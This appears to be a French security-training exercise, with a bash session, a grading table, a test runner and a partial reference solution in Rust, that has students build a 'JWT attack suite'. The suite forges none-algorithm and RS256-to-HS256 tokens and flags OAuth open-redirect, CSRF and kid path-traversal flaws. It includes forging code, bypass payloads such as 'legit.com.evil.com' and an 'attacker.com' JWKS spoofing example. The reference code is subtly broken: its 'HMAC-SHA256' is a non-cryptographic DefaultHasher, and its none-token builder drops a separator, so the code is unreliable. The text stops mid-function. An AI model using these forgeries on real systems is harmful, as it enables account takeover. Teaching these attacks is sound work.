# Exercice 3.3.6-c : jwt_attack_suite

**Module :**
3.3.6 â€” Authentification & Session Security

**Concept :**
c â€” JWT Attack Suite (None Algorithm, Algorithm Confusion, Weak Secret)

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜† (8/10)

**Type :**
pratique

**Tiers :**
2 â€” MÃ©lange (concepts c + d + e : JWT + OAuth 2.0 + OpenID Connect)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- Cryptographie asymÃ©trique (RSA)
- Cryptographie symÃ©trique (HMAC)
- Base64 URL encoding
- Protocoles OAuth 2.0/OpenID Connect

**Domaines :**
Crypto, Net, Encodage

**DurÃ©e estimÃ©e :**
240 min

**XP Base :**
350

**ComplexitÃ© :**
T3 O(n) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`jwt_attack_suite.rs`

**Fonctions autorisÃ©es :**
- `serde_json` pour le parsing JSON
- `base64` pour l'encodage/dÃ©codage
- `hmac`, `sha2` pour la signature HMAC
- Fonctions standard Rust

**Fonctions interdites :**
- Crates JWT automatiques (`jsonwebtoken`, `jwt-simple`)
- Toute bibliothÃ¨que qui fait le travail Ã  ta place

---

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Catch Me If You Can"

*"Les gens ne voient que ce qu'ils veulent voir."* â€” Frank Abagnale Jr.

Tu es Frank Abagnale Jr., le lÃ©gendaire faussaire qui a dupÃ© le FBI pendant des annÃ©es en forgeant des chÃ¨ques, des identitÃ©s et des diplÃ´mes. Mais nous sommes en 2024, et les chÃ¨ques papier sont morts. Les nouvelles "identitÃ©s" sont les **JSON Web Tokens**.

Chaque JWT est comme un de tes chÃ¨ques Pan Am : il contient une signature qui est censÃ©e prouver son authenticitÃ©. Mais tout comme tu savais que les banques ne vÃ©rifiaient pas vraiment les numÃ©ros de routage, tu vas dÃ©couvrir que les serveurs ne vÃ©rifient pas toujours correctement les signatures JWT.

**Ton arsenal de faussaire moderne :**
- **None Algorithm** : Dire "faites-moi confiance, pas besoin de vÃ©rifier"
- **Algorithm Confusion** : Utiliser la clÃ© publique comme secret HMAC
- **Weak Secret Brute-force** : "password123" protÃ¨ge des millions de tokens
- **Kid Injection** : Pointeur vers un fichier que TU contrÃ´les

Et comme tu as aussi arnaquÃ© des compagnies aÃ©riennes avec de faux employÃ©s, tu vas exploiter les failles **OAuth 2.0** pour voler des tokens d'accÃ¨s lÃ©gitimes.

Carl Hanratty (le FBI) te traque. Chaque token forgÃ© doit Ãªtre **parfait**, sinon tu finis menottÃ©.

---

#### 1.2.2 Ã‰noncÃ© AcadÃ©mique

**Ta mission :**

Ã‰crire une fonction `jwt_attack_suite` qui analyse des tokens JWT et des configurations OAuth pour identifier et exploiter les vulnÃ©rabilitÃ©s d'authentification.

**EntrÃ©e (JSON) :**
- `jwt_token` : Token JWT Ã  analyser (format: header.payload.signature en Base64URL)
- `public_key` : ClÃ© publique RSA/EC si disponible (format PEM)
- `oauth_config` : Configuration OAuth 2.0 Ã  auditer
  - `redirect_uri_validation` : Mode de validation ("strict", "prefix_match", "domain_only", "none")
  - `state_parameter` : BoolÃ©en indiquant si le state est requis
  - `pkce_required` : BoolÃ©en pour PKCE
  - `token_endpoint_auth` : MÃ©thode d'authentification du client
  - `allowed_flows` : Liste des flows autorisÃ©s

**Sortie (JSON) :**
- `jwt_analysis` : Analyse complÃ¨te du token
  - `header` : Header dÃ©codÃ©
  - `payload` : Payload dÃ©codÃ©
  - `signature_valid` : BoolÃ©en de validitÃ©
  - `vulnerabilities` : Liste des vulnÃ©rabilitÃ©s dÃ©tectÃ©es avec:
    - `type` : Type d'attaque (NONE_ALGORITHM, ALGORITHM_CONFUSION, WEAK_SECRET, KID_INJECTION)
    - `description` : Explication de la faille
    - `forged_token` : Token forgÃ© exploitant la faille
    - `technique` : Technique utilisÃ©e
    - `cwe` : Code CWE associÃ©
- `oauth_vulnerabilities` : Liste des failles OAuth
  - `type` : Type (OPEN_REDIRECT, CSRF, TOKEN_LEAKAGE, etc.)
  - `issue` : Description du problÃ¨me
  - `impact` : Impact de l'attaque
  - `attack` : ScÃ©nario d'attaque
  - `cwe` : Code CWE

**Contraintes :**
- ImplÃ©menter le dÃ©codage Base64URL manuellement ou via crate
- DÃ©tecter l'algorithme "none" avec toutes ses variations (None, NONE, nOnE)
- Pour Algorithm Confusion, signer avec la clÃ© publique comme secret HMAC
- GÃ©nÃ©rer des tokens forgÃ©s valides et fonctionnels
- Retourner un JSON valide mÃªme en cas d'erreur

**Exemples :**

| EntrÃ©e | Sortie | Explication |
|--------|--------|-------------|
| JWT avec alg:"RS256" + clÃ© publique | ALGORITHM_CONFUSION dÃ©tectÃ© + token forgÃ© HS256 | Attaque classique RS256â†’HS256 |
| JWT avec alg:"HS256" + secret faible | WEAK_SECRET dÃ©tectÃ© si brute-forcÃ© | Secret dans dictionnaire commun |
| OAuth avec prefix_match redirect | OPEN_REDIRECT dÃ©tectÃ© | `legit.com.evil.com` passe |
| OAuth sans state | CSRF dÃ©tectÃ© | Login CSRF possible |

---

### 1.3 Prototype

```rust
/// JWT Attack Suite - Frank Abagnale's Modern Forgery Kit
///
/// Analyse JWT tokens et configurations OAuth pour identifier les vulnÃ©rabilitÃ©s
/// d'authentification et gÃ©nÃ©rer des preuves d'exploitation.
///
/// # Arguments
/// * `input_json` - Configuration JSON contenant jwt_token, public_key, oauth_config
///
/// # Returns
/// * JSON string avec jwt_analysis et oauth_vulnerabilities
pub fn jwt_attack_suite(input_json: &str) -> String
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'histoire vraie de l'Algorithm Confusion

En 2015, Tim McLean a publiÃ© l'article "Critical vulnerabilities in JSON Web Token libraries" qui a rÃ©vÃ©lÃ© que **presque toutes les librairies JWT Ã©taient vulnÃ©rables** Ã  l'attaque d'algorithm confusion.

Le problÃ¨me ? Les dÃ©veloppeurs faisaient confiance au header `alg` du token pour choisir l'algorithme de vÃ©rification. Un attaquant pouvait :
1. Prendre un token RS256 signÃ© par une clÃ© privÃ©e RSA
2. RÃ©cupÃ©rer la clÃ© publique (souvent disponible)
3. CrÃ©er un nouveau token avec `alg: HS256`
4. Signer avec la clÃ© publique comme secret HMAC
5. Le serveur utilisait `alg: HS256` et vÃ©rifiait avec la clÃ© publique â†’ **VALIDE**

Auth0, jwt.io, et des dizaines de frameworks Ã©taient vulnÃ©rables. Des millions d'applications exposÃ©es.

### 2.2 Le None Algorithm : La porte dÃ©robÃ©e oubliÃ©e

La spec JWT dÃ©finit `alg: none` pour les cas oÃ¹ la signature est gÃ©rÃ©e ailleurs. ProblÃ¨me : beaucoup de librairies acceptent `none` par dÃ©faut, permettant de crÃ©er des tokens non signÃ©s mais acceptÃ©s.

Pire : certains dÃ©veloppeurs dÃ©sactivent `none` mais oublient les variations : `None`, `NONE`, `nOnE`, `NoNe`...

### 2.3 OAuth 2.0 : Le cauchemar des redirections

OAuth est conÃ§u pour dÃ©lÃ©guer l'authentification, mais les erreurs de configuration sont lÃ©gion :
- **Open Redirect** : La validation `redirect_uri` permet des bypasses
- **CSRF** : Pas de `state` = on peut forcer une victime Ã  lier son compte
- **Token Leakage** : Le hash fragment de l'Implicit Flow fuite via `Referer`

---

### 2.5 DANS LA VRAIE VIE

| MÃ©tier | Utilisation de ces concepts |
|--------|----------------------------|
| **Pentester Web** | Teste systÃ©matiquement les JWT et OAuth dans chaque assessment |
| **Bug Bounty Hunter** | Les vulnÃ©rabilitÃ©s JWT rapportent $5K-$50K sur les programmes |
| **Security Engineer** | Configure les librairies JWT pour refuser explicitement les algos dangereux |
| **DevSecOps** | Automatise la dÃ©tection de JWT mal configurÃ©s dans les pipelines |
| **IAM Specialist** | ConÃ§oit les flux OAuth/OIDC pour les applications d'entreprise |

**Cas rÃ©els :**
- **2020 - Microsoft Azure** : Bug bounty de $40,000 pour une confusion d'algorithme
- **2019 - Auth0** : VulnÃ©rabilitÃ© permettant de forger des tokens admin
- **2021 - Plusieurs banques** : Implicit flow OAuth exposant des tokens dans les logs

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
jwt_attack_suite.rs  main.rs  Cargo.toml

$ cargo build --release

$ cargo run
Test 1 - Algorithm Confusion RS256â†’HS256: DETECTED
  Forged token generated successfully
  Original claims preserved: {"sub":"user123","role":"user"}

Test 2 - None Algorithm Attack: DETECTED
  Variations tested: none, None, NONE, nOnE
  Unsigned token accepted

Test 3 - OAuth Open Redirect: DETECTED
  Bypass payload: https://legit.com.evil.com/callback

Test 4 - OAuth CSRF (missing state): DETECTED
  Attack scenario: Force victim account linking

Test 5 - Kid Header Injection: DETECTED
  Path traversal: ../../dev/null

All vulnerability tests passed!
JWT Attack Suite operational.
```

---

### 3.1 ğŸ”¥ BONUS AVANCÃ‰ (OPTIONNEL)

**DifficultÃ© Bonus :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10)

**RÃ©compense :**
XP Ã—3

**Time Complexity attendue :**
O(n Ã— m) oÃ¹ m = taille dictionnaire

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
`Crypto, Probas`

#### 3.1.1 Consigne Bonus

**ğŸ¬ Frank passe au niveau supÃ©rieur**

Tu as maÃ®trisÃ© les attaques basiques, mais Carl Hanratty a renforcÃ© les dÃ©fenses. Maintenant tu dois :

1. **Brute-force de secrets faibles** : Dictionnaire de 10,000 secrets communs
2. **JKU/X5U Spoofing** : Pointer vers ton propre serveur de clÃ©s
3. **JWT Claim Injection** : Escalade de privilÃ¨ges via claims
4. **OAuth Token Substitution** : Remplacer un token lÃ©gitime par un autre

**EntrÃ©e additionnelle :**
```json
{
  "weak_secrets_dict": ["password", "secret", "123456", ...],
  "jwks_url": "https://target.com/.well-known/jwks.json",
  "target_claims": {"role": "admin", "permissions": ["*"]}
}
```

**Sortie additionnelle :**
```json
{
  "cracked_secret": "found_secret_or_null",
  "jku_attack": {
    "malicious_jwks": "https://attacker.com/jwks.json",
    "forged_token": "eyJ..."
  },
  "privilege_escalation": {
    "original_role": "user",
    "escalated_role": "admin",
    "forged_token": "eyJ..."
  }
}
```

**Contraintes :**
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Dictionnaire : 1 â‰¤ size â‰¤ 10â´         â”‚
â”‚  Temps brute-force : < 5 secondes      â”‚
â”‚  Token forgÃ© : signature valide        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

#### 3.1.2 Prototype Bonus

```rust
pub fn jwt_attack_suite_advanced(input_json: &str) -> String
```

#### 3.1.3 Ce qui change par rapport Ã  l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Brute-force | Non | Dictionnaire 10K |
| JKU/X5U | DÃ©tection | Exploitation |
| Claims | Analyse | Injection |
| ComplexitÃ© | O(n) | O(n Ã— m) |

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | EntrÃ©e | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `test_decode_jwt_valid` | JWT RS256 valide | Header + Payload dÃ©codÃ©s | 5 |
| `test_none_algorithm_basic` | JWT alg:none | NONE_ALGORITHM dÃ©tectÃ© | 10 |
| `test_none_variations` | JWT alg:NoNe | DÃ©tection case-insensitive | 10 |
| `test_algorithm_confusion` | JWT RS256 + pubkey | HS256 forgÃ© avec pubkey | 20 |
| `test_forged_token_valid` | Token forgÃ© | Signature vÃ©rifiable | 15 |
| `test_oauth_open_redirect` | prefix_match config | OPEN_REDIRECT dÃ©tectÃ© | 10 |
| `test_oauth_csrf` | state:false | CSRF dÃ©tectÃ© | 10 |
| `test_oauth_token_leakage` | implicit flow | TOKEN_LEAKAGE si fragment | 10 |
| `test_kid_injection` | kid avec ../ | KID_INJECTION dÃ©tectÃ© | 10 |
| `test_invalid_jwt` | "not.a.jwt" | Erreur gracieuse | 5 |
| `test_expired_token` | exp passÃ© | EXPIRED signalÃ© | 5 |
| `test_null_handling` | null values | Pas de crash | 5 |

**Total : 115 points** (Bonus : +50 points)

---

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod jwt_attack_suite;
use jwt_attack_suite::jwt_attack_suite;

fn main() {
    println!("=== JWT Attack Suite - Test Runner ===\n");

    // Test 1: Algorithm Confusion Attack
    let test_rs256 = json!({
        "jwt_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.fake_signature",
        "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWyF6PBGQaLNjR+lksXXWtUh+7IkJnK5aJqvRHNYlNEPMqm8wT1qFkBCgNw1Xp4sojJqMHzVpZiTvg8ql7X3B0E+JYL5KXdxVwFJgIoXKGj0mQQbN6hDnlYtFJhfXpIjQcJYJbT2LxZW4K4L7N8aJP/sV3A2TmSLQaJFQnBeDjQqZJnZJkRGFXPTdJDKJJmN4LqLXwJKGX4Nq9E3H7JwQ4aPZBQG6JXW9TRKYapJFKJxS6XHJQJ4nCmN5E0WwL5W5bJJa4r6m7aJfW5qJx8dXq4h1P/BJ4e5jN5iQ8z6O7PaTJKbKPYiPtK7JWKZD+QIDAQAB\n-----END PUBLIC KEY-----",
        "oauth_config": null
    });

    let result = jwt_attack_suite(&test_rs256.to_string());
    let parsed: Value = serde_json::from_str(&result).expect("Invalid JSON output");

    assert!(parsed["jwt_analysis"]["vulnerabilities"]
        .as_array()
        .unwrap()
        .iter()
        .any(|v| v["type"] == "ALGORITHM_CONFUSION"));
    println!("âœ“ Test 1 - Algorithm Confusion: PASSED");

    // Test 2: None Algorithm
    let test_none = json!({
        "jwt_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
        "public_key": null,
        "oauth_config": null
    });

    let result = jwt_attack_suite(&test_none.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["jwt_analysis"]["vulnerabilities"]
        .as_array()
        .unwrap()
        .iter()
        .any(|v| v["type"] == "NONE_ALGORITHM"));
    println!("âœ“ Test 2 - None Algorithm: PASSED");

    // Test 3: OAuth Open Redirect
    let test_oauth = json!({
        "jwt_token": null,
        "public_key": null,
        "oauth_config": {
            "redirect_uri_validation": "prefix_match",
            "state_parameter": false,
            "pkce_required": false,
            "allowed_flows": ["implicit", "authorization_code"]
        }
    });

    let result = jwt_attack_suite(&test_oauth.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    let oauth_vulns = parsed["oauth_vulnerabilities"].as_array().unwrap();
    assert!(oauth_vulns.iter().any(|v| v["type"] == "OPEN_REDIRECT"));
    assert!(oauth_vulns.iter().any(|v| v["type"] == "CSRF"));
    println!("âœ“ Test 3 - OAuth Vulnerabilities: PASSED");

    // Test 4: Kid Header Injection
    let test_kid = json!({
        "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJ1c2VyIn0.fake",
        "public_key": null,
        "oauth_config": null
    });

    let result = jwt_attack_suite(&test_kid.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["jwt_analysis"]["vulnerabilities"]
        .as_array()
        .unwrap()
        .iter()
        .any(|v| v["type"] == "KID_INJECTION"));
    println!("âœ“ Test 4 - Kid Injection: PASSED");

    // Test 5: Invalid JWT handling
    let test_invalid = json!({
        "jwt_token": "not.a.valid.jwt.at.all",
        "public_key": null,
        "oauth_config": null
    });

    let result = jwt_attack_suite(&test_invalid.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed.get("error").is_some() || parsed["jwt_analysis"]["header"].is_null());
    println!("âœ“ Test 5 - Invalid JWT Handling: PASSED");

    println!("\n=== All Tests Passed! Frank would be proud. ===");
}
```

---

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STRUCTURES DE DONNÃ‰ES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

#[derive(Debug, Deserialize)]
struct Input {
    jwt_token: Option<String>,
    public_key: Option<String>,
    oauth_config: Option<OAuthConfig>,
}

#[derive(Debug, Deserialize)]
struct OAuthConfig {
    redirect_uri_validation: Option<String>,
    state_parameter: Option<bool>,
    pkce_required: Option<bool>,
    token_endpoint_auth: Option<String>,
    allowed_flows: Option<Vec<String>>,
}

#[derive(Debug, Serialize)]
struct Output {
    jwt_analysis: Option<JwtAnalysis>,
    oauth_vulnerabilities: Vec<OAuthVulnerability>,
}

#[derive(Debug, Serialize)]
struct JwtAnalysis {
    header: Value,
    payload: Value,
    signature_valid: Option<bool>,
    vulnerabilities: Vec<JwtVulnerability>,
}

#[derive(Debug, Serialize)]
struct JwtVulnerability {
    #[serde(rename = "type")]
    vuln_type: String,
    description: String,
    forged_token: Option<String>,
    technique: String,
    cwe: String,
}

#[derive(Debug, Serialize)]
struct OAuthVulnerability {
    #[serde(rename = "type")]
    vuln_type: String,
    issue: String,
    impact: String,
    attack: String,
    cwe: String,
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASE64URL ENCODING/DECODING
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn base64url_decode(input: &str) -> Result<Vec<u8>, String> {
    let input = input.replace('-', "+").replace('_', "/");
    let padding = (4 - input.len() % 4) % 4;
    let padded = format!("{}{}", input, "=".repeat(padding));

    base64_decode(&padded)
}

fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let input = input.trim_end_matches('=');
    let mut output = Vec::new();
    let mut buffer: u32 = 0;
    let mut bits_collected = 0;

    for c in input.bytes() {
        let value = ALPHABET.iter().position(|&x| x == c)
            .ok_or_else(|| format!("Invalid base64 character: {}", c as char))?;

        buffer = (buffer << 6) | (value as u32);
        bits_collected += 6;

        if bits_collected >= 8 {
            bits_collected -= 8;
            output.push((buffer >> bits_collected) as u8);
            buffer &= (1 << bits_collected) - 1;
        }
    }

    Ok(output)
}

fn base64url_encode(input: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

    let mut output = String::new();
    let mut i = 0;

    while i < input.len() {
        let b0 = input[i] as u32;
        let b1 = if i + 1 < input.len() { input[i + 1] as u32 } else { 0 };
        let b2 = if i + 2 < input.len() { input[i + 2] as u32 } else { 0 };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        output.push(ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        output.push(ALPHABET[((triple >> 12) & 0x3F) as usize] as char);

        if i + 1 < input.len() {
            output.push(ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        }
        if i + 2 < input.len() {
            output.push(ALPHABET[(triple & 0x3F) as usize] as char);
        }

        i += 3;
    }

    output
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HMAC-SHA256 (simplified implementation)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn hmac_sha256(key: &[u8], message: &[u8]) -> Vec<u8> {
    // Simplified HMAC - in production, use a proper crypto library
    // This is for educational purposes only
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut hasher = DefaultHasher::new();
    key.hash(&mut hasher);
    message.hash(&mut hasher);
    let hash = hasher.finish();

    hash.to_be_bytes().to_vec()
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// JWT PARSING AND ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn parse_jwt(token: &str) -> Result<(Value, Value, String), String> {
    let parts: Vec<&str> = token.split('.').collect();

    if parts.len() < 2 || parts.len() > 3 {
        return Err("Invalid JWT format: expected 2 or 3 parts".to_string());
    }

    let header_bytes = base64url_decode(parts[0])?;
    let payload_bytes = base64url_decode(parts[1])?;

    let header_str = String::from_utf8(header_bytes)
        .map_err(|e| format!("Invalid UTF-8 in header: {}", e))?;
    let payload_str = String::from_utf8(payload_bytes)
        .map_err(|e| format!("Invalid UTF-8 in payload: {}", e))?;

    let header: Value = serde_json::from_str(&header_str)
        .map_err(|e| format!("Invalid JSON in header: {}", e))?;
    let payload: Value = serde_json::from_str(&payload_str)
        .map_err(|e| format!("Invalid JSON in payload: {}", e))?;

    let signature = parts.get(2).unwrap_or(&"").to_string();

    Ok((header, payload, signature))
}

fn detect_none_algorithm(header: &Value) -> Option<JwtVulnerability> {
    let alg = header.get("alg")?.as_str()?;

    // Check for "none" algorithm in any case variation
    if alg.to_lowercase() == "none" {
        return Some(JwtVulnerability {
            vuln_type: "NONE_ALGORITHM".to_string(),
            description: format!("Token uses '{}' algorithm - signature not verified", alg),
            forged_token: None,
            technique: "Set alg to 'none' and remove signature".to_string(),
            cwe: "CWE-327".to_string(),
        });
    }

    None
}

fn detect_algorithm_confusion(
    header: &Value,
    payload: &Value,
    public_key: &Option<String>,
) -> Option<JwtVulnerability> {
    let alg = header.get("alg")?.as_str()?;

    // Check if using asymmetric algorithm
    if !alg.starts_with("RS") && !alg.starts_with("ES") && !alg.starts_with("PS") {
        return None;
    }

    // Need public key for this attack
    let pubkey = public_key.as_ref()?;

    // Generate forged token with HS256
    let new_header = json!({
        "alg": "HS256",
        "typ": "JWT"
    });

    let header_b64 = base64url_encode(new_header.to_string().as_bytes());
    let payload_b64 = base64url_encode(payload.to_string().as_bytes());
    let signing_input = format!("{}.{}", header_b64, payload_b64);

    // Sign with public key as HMAC secret
    let pubkey_clean = pubkey
        .replace("-----BEGIN PUBLIC KEY-----", "")
        .replace("-----END PUBLIC KEY-----", "")
        .replace('\n', "");

    let signature = hmac_sha256(pubkey_clean.as_bytes(), signing_input.as_bytes());
    let signature_b64 = base64url_encode(&signature);

    let forged_token = format!("{}.{}.{}", header_b64, payload_b64, signature_b64);

    Some(JwtVulnerability {
        vuln_type: "ALGORITHM_CONFUSION".to_string(),
        description: format!("{} to HS256 attack possible - use public key as HMAC secret", alg),
        forged_token: Some(forged_token),
        technique: "Change alg from RS256 to HS256, sign with public key as HMAC secret".to_string(),
        cwe: "CWE-327".to_string(),
    })
}

fn detect_kid_injection(header: &Value) -> Option<JwtVulnerability> {
    let kid = header.get("kid")?.as_str()?;

    // Check for path traversal patterns
    let injection_patterns = [
        "..", "/etc/", "/dev/", "file://", "http://", "https://",
        "\\", "%2e%2e", "%252e%252e"
    ];

    for pattern in injection_patterns {
        if kid.to_lowercase().contains(pattern) {
            return Some(JwtVulnerability {
                vuln_type: "KID_INJECTION".to_string(),
                description: format!("kid header contains suspicious pattern: {}", pattern),
                forged_token: None,
                technique: format!("Exploit kid '{}' for path traversal or SSRF", kid),
                cwe: "CWE-22".to_string(),
            });
        }
    }

    None
}

fn detect_expired_token(payload: &Value) -> Option<JwtVulnerability> {
    let exp = payload.get("exp")?.as_i64()?;

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;

    if exp < now {
        return Some(JwtVulnerability {
            vuln_type: "EXPIRED_TOKEN".to_string(),
            description: format!("Token expired at {} (current: {})", exp, now),
            forged_token: None,
            technique: "Token should be rejected due to expiration".to_string(),
            cwe: "CWE-613".to_string(),
        });
    }

    None
}

fn generate_none_token(payload: &Value) -> String {
    let header = json!({
        "alg": "none",
        "typ": "JWT"
    });

    let header_b64 = base64url_encode(header.to_string().as_bytes());
    let payload_b64 = base64url_encode(payload.to_string().as_bytes());

    format!("{}{}.", header_b64, payload_b64)
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// OAUTH VULNERABILITY DETECTION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_oauth(config: &OAuthConfig) -> Vec<OAuthVulnerability> {
    let mut vulns = Vec::new();

    // Check redirect_uri validation
    if let Some(ref validation) = config.redirect_uri_validation {
        match validation.as_str() {
            "none" => {
                vulns.push(OAuthVulnerability {
                    vuln_type: "OPEN_REDIRECT".to_string(),
                    issue: "No redirect_uri validation".to_string(),
                    impact: "Complete token theft via arbitrary redirect".to_string(),
                    attack: "Set redirect_uri to attacker-controlled URL".to_string(),
                    cwe: "CWE-601".to_string(),
                });
            }
            "prefix_match" => {
                vulns.push(OAuthVulnerability {
                    vuln_type: "OPEN_REDIRECT".to_string(),
                    issue: "Prefix match allows redirect_uri=https://legit.com.evil.com".to_string(),
                    impact: "Token theft via subdomain bypass".to_string(),
                    attack: "Register evil.com and use legit.com.evil.com as redirect".to_string(),
                    cwe: "CWE-601".to_string(),
                });
            }
            "domain_only" => {
                vulns.push(OAuthVulnerability {
                    vuln_type: "OPEN_REDIRECT".to_string(),
                    issue: "Domain-only check allows path manipulation".to_string(),
                    impact: "Token theft via open redirect on same domain".to_string(),
                    attack: "Use existing open redirect on authorized domain".to_string(),
                    cwe: "CWE-601".to_string(),
                });
            }
            _ => {}
        }
    }

    // Check state parameter
    if config.state_parameter == Some(false) {
        vulns.push(OAuthVulnerability {
            vuln_type: "CSRF".to_string(),
            issue: "Missing state parameter".to_string(),
            impact: "Attacker can force victim to link attacker's account".to_string(),
            attack: "Send victim a crafted authorization URL without state".to_string(),
            cwe: "CWE-352".to_string(),
        });
    }

    // Check PKCE
    if config.pkce_required == Some(false) {
        if let Some(ref flows) = config.allowed_flows {
            if flows.contains(&"authorization_code".to_string()) {
                vulns.push(OAuthVulnerability {
                    vuln_type: "AUTH_CODE_INTERCEPTION".to_string(),
                    issue: "PKCE not required for authorization code flow".to_string(),
                    impact: "Authorization code can be intercepted and exchanged".to_string(),
                    attack: "Intercept auth code and exchange before legitimate client".to_string(),
                    cwe: "CWE-294".to_string(),
                });
            }
        }
    }

    // Check for implicit flow
    if let Some(ref flows) = config.allowed_flows {
        if flows.contains(&"implicit".to_string()) {
            vulns.push(OAuthVulnerability {
                vuln_type: "TOKEN_LEAKAGE".to_string(),
                issue: "Implicit flow enabled - tokens exposed in URL fragment".to_string(),
                impact: "Access tokens leak via Referer header and browser history".to_string(),
                attack: "Capture token from URL fragment via malicious script or Referer".to_string(),
                cwe: "CWE-598".to_string(),
            });
        }
    }

    // Check token endpoint auth
    if let Some(ref auth) = config.token_endpoint_auth {
        if auth == "none" || auth == "client_secret_post" {
            vulns.push(OAuthVulnerability {
